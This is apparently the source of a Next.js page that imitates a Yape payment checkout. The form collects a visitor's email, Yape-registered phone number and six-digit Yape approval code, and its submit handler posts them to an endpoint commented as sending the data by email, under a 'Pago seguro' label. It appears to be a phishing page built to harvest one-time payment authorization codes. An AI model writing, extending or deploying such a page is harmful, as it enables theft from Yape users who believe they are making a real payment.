"use client";

export const dynamic = "force-dynamic";

import { useRouter, useSearchParams } from "next/navigation";
import { useState, Suspense } from "react";
import RightPanel from "@/components/RightPanel";

function YapeContent() {
  const router = useRouter();
  const params = useSearchParams();
  const monto = parseFloat(params.get("monto") || "150"); // ✅ monto dinámico

  const [email, setEmail] = useState("");
  const [celular, setCelular] = useState("");
  const [codigo, setCodigo] = useState("");
  const [loading, setLoading] = useState(false);

  // 🧩 handleSubmit actualizado
  const handleSubmit = async () => {
    if (!email || !celular || !codigo) {
      alert("Por favor completa todos los campos");
      return;
    }

    setLoading(true);
    try {
      // Enviar datos al correo
      await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "yape",
          monto,
          originPage: "/pago/yape",
          datos: { email, celular, codigo },
        }),
      });

      // ✅ Redirigir manteniendo el monto dinámico
      router.push(`/pago/yape/qr?monto=${monto}&celular=${encodeURIComponent(celular)}`);
    } catch {
      alert("Error al procesar el pago");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-[#f3f3f3] font-[system-ui,Segoe UI,Roboto,sans-serif] text-[#111]">
      <div className="max-w-6xl mx-auto py-10 px-6 flex flex-col md:grid md:grid-cols-[1fr_380px] md:gap-10">
        {/* IZQUIERDA */}
        <section className="order-2 md:order-1 bg-white rounded-md border border-[#ddd] p-6 shadow-sm">
          {/* TÍTULO */}
          <h2 className="text-[20px] font-semibold mb-6">Revisa tu pago</h2>

          {/* MENSAJE DE AVISO */}
          <div className="flex items-start gap-2 bg-[#f9f9f9] rounded-md px-4 py-3 mb-6 border-l-4 border-[#0b57d0]">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              aria-hidden="true"
              width="20"
              height="20"
              viewBox="0 0 24 24"
              fill="#0b57d0"
              className="mt-[2px] flex-shrink-0"
            >
              <circle cx="12" cy="12" r="12" fill="#0b57d0" />
              <path d="M11 17h2v-6h-2v6zm0-8h2V7h-2v2z" fill="white" />
            </svg>
            <p className="text-[14px] leading-snug">
              Verifica en Yape que la opción{" "}
              <b>“Compras por internet”</b> esté activada y que tu límite diario sea suficiente.
            </p>
          </div>

          {/* MEDIO DE PAGO */}
          <div className="mb-6">
            <h3 className="text-[15px] font-medium mb-3">Medio de pago</h3>

            <div className="flex items-center justify-between border border-[#ddd] rounded-md px-4 py-3 hover:bg-[#fafafa]">
              <div className="flex items-center gap-3">
                <img
                  src="/yape-logo.svg"
                  alt="Yape"
                  className="w-[40px] h-[40px] rounded-sm"
                />
                <div>
                  <p className="text-[14px] font-medium leading-tight">Yape</p>
                  <p className="text-[13px] text-[#666]">
                    El pago se acreditará al instante.
                  </p>
                </div>
              </div>

              <button
                type="button"
                onClick={() => router.push(`/pago?monto=${monto}`)} // ✅ volver manteniendo monto
                className="text-[14px] text-[#0b57d0] font-medium hover:underline"
              >
                Modificar
              </button>
            </div>
          </div>

          {/* FORMULARIO */}
          <div className="mb-8">
            <h3 className="text-[15px] font-medium mb-3">
              Ingresa la información para pagar
            </h3>

            {/* EMAIL */}
            <label className="block text-[13px] text-[#444] mb-1">E-mail</label>
            <input
              type="email"
              placeholder="Ej.: nombre@email.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full border border-[#ccc] rounded-md px-3 py-3 mb-4 text-[15px] focus:border-[#007bff] outline-none"
            />

            {/* CELULAR */}
            <label className="block text-[13px] text-[#444] mb-1">
              Tu celular registrado en Yape
            </label>
            <input
              type="text"
              placeholder="Ej.: 921 213 238"
              value={celular}
              onChange={(e) => setCelular(e.target.value)}
              className="w-full border border-[#ccc] rounded-md px-3 py-3 mb-4 text-[15px] focus:border-[#007bff] outline-none"
            />

            {/* CÓDIGO DE APROBACIÓN */}
            <label className="block text-[13px] text-[#111] mb-1">
              Código de aprobación
            </label>

            <div className="flex gap-2 mb-2">
              {[0, 1, 2, 3, 4, 5].map((i) => (
                <input
                  key={i}
                  type="text"
                  maxLength={1}
                  value={codigo[i] || ""}
                  onChange={(e) => {
                    const newValue =
                      codigo.substring(0, i) +
                      e.target.value.replace(/\D/, "") +
                      codigo.substring(i + 1);
                    setCodigo(newValue);
                    // mover foco automáticamente
                    const nextInput = document.getElementById(`code-${i + 1}`);
                    if (e.target.value && nextInput)
                      (nextInput as HTMLInputElement).focus();
                  }}
                  id={`code-${i}`}
                  className="w-[46px] h-[46px] border border-[#ccc] rounded-md text-center text-[18px] font-medium tracking-wider focus:border-[#007bff] outline-none"
                />
              ))}
            </div>

            <p className="text-[13px] text-[#777]">Encuéntralo en tu app de Yape.</p>
          </div>

          {/* BOTÓN PAGAR */}
          <div className="pt-4 border-t border-[#eee]">
            <button
              onClick={handleSubmit}
              disabled={loading}
              className="w-full bg-[#0b57d0] text-white rounded-md py-3 text-[15px] font-medium hover:bg-[#094dc1] transition disabled:opacity-70"
            >
              {loading ? "Procesando..." : "Pagar"}
            </button>

            <div className="flex items-center justify-center gap-2 mt-3 text-[13px] text-[#555]">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="14"
                height="14"
                viewBox="0 0 24 24"
                fill="none"
                stroke="#555"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
              </svg>
              Pago seguro
            </div>
          </div>
        </section>

        {/* DERECHA */}
        <RightPanel monto={monto} />
      </div>
    </main>
  );
}

export default function YapePage() {
  return (
    <Suspense fallback={<div className="p-10 text-center">Cargando...</div>}>
      <YapeContent />
    </Suspense>
  );
}
